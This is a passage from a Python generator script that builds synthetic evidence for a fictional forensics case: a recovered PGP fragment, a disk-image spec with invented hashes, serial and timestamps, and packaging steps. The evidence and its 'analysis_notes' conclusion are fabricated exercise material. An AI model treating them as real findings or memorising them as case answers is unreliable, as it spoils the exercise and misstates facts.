hQEMA8qF+2j/CORRUPTED_HEADER_UNRECOVERABLE
-----END PGP MESSAGE-----

# File metadata recovered from journal:
# Created: 2024-11-01 03:47:22 UTC  
# Modified: 2024-11-14 23:52:17 UTC
# Deleted: 2024-11-15 00:01:33 UTC
# Recovery: partial (38% of 4,096 byte file)
"""
    
    with open(disk_dir / "deleted_.intent_log.txt", 'w', encoding='utf-8') as f:
        f.write(deleted_file_content)
    
    # Disk image specification with forensic metadata
    disk_spec = {
        "image_format": "E01",  # Expert Witness Format - standard forensic format
        "size_bytes": 536870912,  # 512MB
        "filesystem": "APFS",
        "source": {
            "device": "MacBook Pro (M1, 2021)",
            "serial": "C02G7XXXXXXX",
            "os_version": "macOS 14.1.1 (23B81)",
        },
        "acquisition": {
            "date": DISAPPEARANCE_TIME.isoformat(),
            "tool": "FTK Imager 4.7.1",
            "hash_md5": "a7f3c21e8b9d4f6a2c1e0d8b7a6f5e4d",
            "hash_sha256": "e8b2f440d1c2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8",
            "verified": True,
        },
        "contents": {
            "browser_cache": "~/Library/Application Support/Google/Chrome/Default/",
            "shell_history": "~/.zsh_history",
            "deleted_files": [
                {
                    "path": "~/.notes.gpg",
                    "status": "deleted - partially recoverable",
                    "recovery_method": "file carving from unallocated clusters",
                    "file_signature": "-----BEGIN PGP MESSAGE-----",
                    "mac_times": {
                        "modified": "2024-11-14T23:52:17Z",
                        "accessed": "2024-11-15T00:01:31Z",
                        "created": "2024-11-01T03:47:22Z",
                        "deleted": "2024-11-15T00:01:33Z",
                    },
                    "recovery_percentage": 38,
                },
            ],
        },
        "analysis_notes": "Partial file recovery from deleted .notes.gpg reveals encrypted personal notes with fragments indicating coordination with external party",
    }
    
    with open(disk_dir / "disk_spec.json", 'w', encoding='utf-8') as f:
        json.dump(disk_spec, f, indent=2)


# ============================================================================
# MAIN GENERATION FUNCTION
# ============================================================================

def generate_all_artifacts(output_dir: Path):
    """Generate all case artifacts."""
    
    print(f"Generating Case 001 artifacts in: {output_dir}")
    
    print("  [1/5] Generating GitHub export...")
    generate_github_structure(output_dir)
    
    print("  [2/5] Generating Telegram export...")
    generate_telegram_export(output_dir)
    
    print("  [3/5] Generating image dump metadata...")
    generate_image_dump(output_dir)
    
    print("  [4/5] Generating PCAP specification...")
    generate_pcap_metadata(output_dir)
    
    print("  [5/5] Generating disk image specification...")
    generate_disk_image_spec(output_dir)
    
    print("\n✅ Artifact generation complete!")
    print("\nNext steps:")
    print("  1. Generate actual image files using images/GENERATE_IMAGES.md")
    print("  2. Generate PCAP using network_capture/generate_pcap.py")
    print("  3. Create disk image using disk_image/disk_spec.json")
    print("  4. Package artifacts: tar -czvf case_001_artifacts.tar.gz artifacts/")
    print("  5. Upload to MinIO storage")
    print("  6. Register case in database")


if __name__ == "__main__":
    output_path = Path(__file__).parent / "artifacts"
    generate_all_artifacts(output_path)
